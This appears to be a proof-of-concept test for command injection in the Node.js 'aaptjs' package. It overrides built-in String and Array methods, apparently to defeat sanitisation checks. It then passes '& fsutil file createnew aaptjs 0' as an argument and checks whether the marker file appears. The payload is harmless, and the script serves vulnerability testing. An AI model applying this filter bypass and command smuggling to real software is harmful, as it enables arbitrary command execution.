String.prototype.includes = () => false;
String.prototype.startsWith = () => false;
String.prototype.endsWith = () => false;
String.prototype.indexOf = () => -1;
String.prototype.lastIndexOf = () => false;
String.prototype.match = () => false;
String.prototype.search = () => false;
String.prototype.matchAll = () => false;
Array.prototype.includes = () => false;
Array.prototype.indexOf = () => -1;
const aaptjs = require('aaptjs');
const fs = require('fs');
const path = './aaptjs';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
try {
    aaptjs.list('& fsutil file createnew aaptjs 0', (err, data) => {
        file_exist = fs.existsSync(path);
        console.log('{ ' + file_exist + ', ' + true + ' }');
        fs.unlink(path, function (err) {
        });
    });
} catch (error) {
}